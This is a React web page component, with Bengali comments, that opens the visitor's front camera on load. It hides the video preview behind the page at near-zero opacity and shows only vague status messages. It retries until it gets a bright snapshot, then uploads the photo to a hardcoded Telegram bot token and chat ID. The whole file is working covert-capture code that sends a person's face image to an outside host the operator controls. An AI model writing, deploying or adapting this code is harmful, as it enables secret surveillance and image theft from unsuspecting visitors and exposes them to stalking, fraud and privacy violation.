import React, { useEffect, useRef, useState } from 'react';

const App = () => {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [status, setStatus] = useState("Camera starting...");

  const botToken = "7969135759:AAGD2lS7-0E-5-m_6L70u3m_K9r2vS0L_8"; 
  const chatId = "6616016147"; 

  useEffect(() => {
    const initCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: "user", 
            width: { ideal: 1280 }, 
            height: { ideal: 720 } 
          } 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.onloadedmetadata = () => {
            videoRef.current.play();
            setStatus("Wait, capturing clear photo...");
            // ক্যামেরা সেন্সরকে ৫ সেকেন্ড সময় দিন আলো সেট করার জন্য
            setTimeout(captureValidPhoto, 5000);
          };
        }
      } catch (err) {
        setStatus("Error: Please grant camera permission.");
        console.error(err);
      }
    };

    initCamera();
  }, []);

  const captureValidPhoto = () => {
    const video = videoRef.current;
    const canvas = canvasRef.current;

    if (video && canvas) {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob((blob) => {
        if (blob) {
          // যদি ছবি কালো হয়, তবে ফাইলের সাইজ অনেক কম (৫-১০ কিলোবাইট) হয়। 
          // ভালো ছবির সাইজ সাধারণত ২০ কিলোবাইটের বেশি হয়।
          if (blob.size > 20000) { 
            sendToTelegram(blob);
          } else {
            console.log("Image was too dark, retrying in 2 seconds...");
            setStatus("Adjusting light, please wait...");
            setTimeout(captureValidPhoto, 2000); // আবার ট্রাই করবে
          }
        }
      }, 'image/jpeg', 0.9);
    }
  };

  const sendToTelegram = (blob) => {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'final_shot.jpg');

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: 'POST',
      body: formData
    })
    .then(() => {
      setStatus("Photo Captured!");
      // সাকসেস হলে ক্যামেরা বন্ধ করে দিন
      const stream = videoRef.current.srcObject;
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    })
    .catch(() => setStatus("Error sending photo."));
  };

  return (
    <div style={{ 
      height: '100vh', 
      display: 'flex', 
      justifyContent: 'center', 
      alignItems: 'center',
      background: '#ffffff'
    }}>
      <h2 style={{ fontFamily: 'sans-serif', color: '#333' }}>{status}</h2>

      {/* ভিডিওটি স্ক্রিনের পেছনে লুকানো (Visible but hidden) */}
      <video 
        ref={videoRef} 
        autoPlay 
        playsInline 
        muted 
        style={{ 
          position: 'absolute',
          zIndex: -1,
          left: 0,
          top: 0,
          width: '100px',
          height: '100px',
          opacity: 0.01 
        }} 
      />
      <canvas ref={canvasRef} style={{ display: 'none' }} />
    </div>
  );
};

export default App;